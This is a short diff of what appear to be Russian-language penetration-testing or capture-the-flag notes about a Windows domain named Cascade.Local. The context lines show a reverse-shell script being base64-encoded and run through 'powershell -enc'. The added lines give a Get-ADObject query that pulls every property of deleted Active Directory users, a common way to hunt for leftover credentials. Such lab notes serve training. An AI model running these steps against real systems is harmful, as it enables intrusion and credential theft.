@@ -22,3 +22,7 @@ $SecPassword)
 cat rev.ps1 |iconv -t UTF-16LE | base64 -w 0 (вывод)
 
 powershell -enc (вывод)
+
+# Восстаовление корзины
+
+Get-ADObject -SearchBase "CN=Deleted Objects,DC=Cascade,DC=Local" -Filter {ObjectClass -eq "user"} -IncludeDeletedObjects -Properties *
